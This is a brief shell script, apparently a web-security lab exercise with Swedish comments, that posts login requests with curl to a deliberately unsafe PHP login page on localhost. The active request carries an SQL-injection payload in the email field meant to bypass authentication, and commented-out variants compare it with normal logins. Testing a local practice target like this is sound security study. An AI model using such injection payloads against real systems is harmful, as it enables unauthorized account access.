#!/bin/sh

echo 'legitim sql attack'
curl -iX  POST localhost/websec/login_unsafe.php \
	-d "email=hejsan@curl' AND 1=1#" \
	-d "password=allizwell1234" 

# echo 'legitim inloggning'
# curl -iX  POST localhost/websec/login_unsafe.php \
# 	-d "email=hejsan@curl" \
# 	-d "password=allizwell123" 

# echo 'illegitim sql attack'
# # legitim sql attack
# curl -iX  POST localhost/websec/login_unsafe.php \
# 	-d "email=hejsan@curl AND 1=1#" \
# 	-d "password=allizwell1234" 

# echo 'legitim illegitim inloggning'
# # legitim sql attack
# curl -iX  POST localhost/websec/login_unsafe.php \
# 	-d "email=hejsan@curl" \
# 	-d "password=allizwell1234" 
